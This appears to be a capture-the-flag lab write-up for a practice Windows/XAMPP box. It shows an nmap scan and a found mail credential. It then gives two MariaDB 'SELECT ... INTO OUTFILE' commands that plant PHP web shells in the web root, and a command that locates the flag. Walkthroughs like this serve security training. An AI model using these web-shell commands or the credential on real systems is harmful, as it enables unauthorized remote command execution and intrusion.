# Assessment Easy

<figure><img src="../../.gitbook/assets/image (73).png" alt=""><figcaption></figcaption></figure>

```
nmap 10.129.203.7 -p 21,25,80,443,587,3306,2289 -sC -sV -oN 10.129.203.7
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-29 03:57 EDT
Nmap scan report for 10.129.203.7
Host is up (0.19s latency).

PORT     STATE    SERVICE     VERSION
21/tcp   open     ftp
|_ssl-date: 2023-06-29T07:59:27+00:00; +1s from scanner time.
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   Help: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     214-The following commands are implemented
|     USER PASS ACCT QUIT PORT RETR
|     STOR DELE RNFR PWD CWD CDUP
|     NOOP TYPE MODE STRU
|     LIST NLST HELP FEAT UTF8 PASV
|     MDTM REST PBSZ PROT OPTS CCC
|     XCRC SIZE MFMT CLNT ABORT
|     HELP command successful
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
25/tcp   open     smtp        hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open     http        Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://10.129.203.7/dashboard/
|_http-server-header: Apache/2.4.53 (Win64) OpenSSL/1.1.1n PHP/7.4.29
443/tcp  open     https       Core FTP HTTPS Server
|_http-server-header: Core FTP HTTPS Server
|_ssl-date: 2023-06-29T07:59:27+00:00; +1s from scanner time.
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
587/tcp  open     smtp        hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
2289/tcp filtered dict-lookup
3306/tcp open     mysql       MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, Support41Auth, LongColumnFlag, Speaks41ProtocolNew, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, IgnoreSigpipes, FoundRows, SupportsCompression, SupportsTransactions, SupportsLoadDataLocal, ODBCClient, InteractiveClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|   Salt: [Rh4j;&L.>.jKy@o3LgA
|_  Auth Plugin Name: mysql_native_password
```

<figure><img src="../../.gitbook/assets/image (21) (1).png" alt=""><figcaption><p>fiona@inlanefreight.htb</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (47) (1).png" alt=""><figcaption><p>fiona@inlanefreight.htb:987654321</p></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (33) (1).png" alt=""><figcaption></figcaption></figure>

```
MariaDB [phpmyadmin]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/webshell.php';
Query OK, 1 row affected (0.190 sec)
```



```
MariaDB [(none)]> SELECT "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>" INTO OUTFILE 'C:/xampp/htdocs/dashboard/webshell2.php';
Query OK, 1 row affected (0.190 sec)
```

<figure><img src="../../.gitbook/assets/image (5) (2) (1).png" alt=""><figcaption></figcaption></figure>

```
dir /s /b C:\flag.txt
```

then type the flag file and get the flag.
